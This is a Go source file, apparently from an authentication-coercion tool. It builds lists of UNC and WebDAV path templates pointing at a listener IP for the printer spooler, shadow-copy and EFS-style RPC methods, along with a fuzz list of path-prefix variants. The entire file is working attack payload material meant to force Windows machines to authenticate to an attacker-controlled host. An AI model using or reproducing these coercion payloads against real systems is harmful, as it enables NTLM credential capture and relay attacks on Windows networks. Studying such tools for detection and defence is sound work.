package methods

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"

	"github.com/TheManticoreProject/manticore-coercer/utils"
)

type TemplateVars struct {
	ListenerIP string
	SMBPort    int
	HTTPPort   int
}

var rndPattern = regexp.MustCompile(`\{\{rnd\((\d+)\)\}\}`)

func RenderPath(template string, vars TemplateVars) string {
	smbPortSuffix := ""
	if vars.SMBPort != 0 && vars.SMBPort != 445 {
		smbPortSuffix = fmt.Sprintf("@%d", vars.SMBPort)
	}

	httpPortSuffix := fmt.Sprintf("@%d", vars.HTTPPort)
	if vars.HTTPPort == 0 {
		httpPortSuffix = "@80"
	}

	result := template
	result = strings.ReplaceAll(result, "{{listener}}", vars.ListenerIP)
	result = strings.ReplaceAll(result, "{{smb_listen_port}}", smbPortSuffix)
	result = strings.ReplaceAll(result, "{{http_listen_port}}", httpPortSuffix)

	result = rndPattern.ReplaceAllStringFunc(result, func(match string) string {
		sub := rndPattern.FindStringSubmatch(match)
		n, _ := strconv.Atoi(sub[1])
		return utils.RandomString(n)
	})

	return result
}

func smbPaths() []ExploitPath {
	return []ExploitPath{
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
	}
}

func smbPathsWithHTTP() []ExploitPath {
	paths := smbPaths()
	paths = append(paths, ExploitPath{
		AuthType: AuthHTTP,
		Template: `\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\share\file.txt`,
	})
	return paths
}

func rprnPaths() []ExploitPath {
	return []ExploitPath{
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}`},
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}/{{rnd(3)}}`},
	}
}

func fsrvpPaths() []ExploitPath {
	return []ExploitPath{
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}`},
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}/{{rnd(3)}}`},
	}
}

func evenPaths() []ExploitPath {
	return []ExploitPath{
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\aa`},
	}
}

func FuzzExploitPaths() []ExploitPath {
	return []ExploitPath{
		// Bare IP
		{AuthType: AuthSMB, Template: `{{listener}}`},

		// Standard UNC
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}\`},
		{AuthType: AuthSMB, Template: `\\{{listener}}{{smb_listen_port}}`},

		// UNC with \\?\ prefix
		{AuthType: AuthSMB, Template: `\\?\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\\?\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\\?\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
		{AuthType: AuthSMB, Template: `\\?\{{listener}}{{smb_listen_port}}\`},
		{AuthType: AuthSMB, Template: `\\?\{{listener}}{{smb_listen_port}}`},

		// UNC with \\.\ prefix
		{AuthType: AuthSMB, Template: `\\.\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\\.\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\\.\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
		{AuthType: AuthSMB, Template: `\\.\{{listener}}{{smb_listen_port}}\`},
		{AuthType: AuthSMB, Template: `\\.\{{listener}}{{smb_listen_port}}`},

		// UNC with \\?\UNC\ prefix
		{AuthType: AuthSMB, Template: `\\?\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\\?\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\\?\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
		{AuthType: AuthSMB, Template: `\\?\UNC\{{listener}}{{smb_listen_port}}\`},
		{AuthType: AuthSMB, Template: `\\?\UNC\{{listener}}{{smb_listen_port}}`},

		// UNC with \??\UNC\ prefix
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\aa`},
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}\`},
		{AuthType: AuthSMB, Template: `\??\UNC\{{listener}}{{smb_listen_port}}`},

		// UNC with \\.\UNC\ prefix
		{AuthType: AuthSMB, Template: `\\.\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\file.txt`},
		{AuthType: AuthSMB, Template: `\\.\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}\`},
		{AuthType: AuthSMB, Template: `\\.\UNC\{{listener}}{{smb_listen_port}}\{{rnd(8)}}`},
		{AuthType: AuthSMB, Template: `\\.\UNC\{{listener}}{{smb_listen_port}}\`},
		{AuthType: AuthSMB, Template: `\\.\UNC\{{listener}}{{smb_listen_port}}`},

		// HTTP
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}\{{rnd(3)}}\File.txt`},
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}\{{rnd(3)}}\`},
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}\{{rnd(3)}}`},
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}\`},
		{AuthType: AuthHTTP, Template: `\\{{listener}}{{http_listen_port}}`},
	}
}
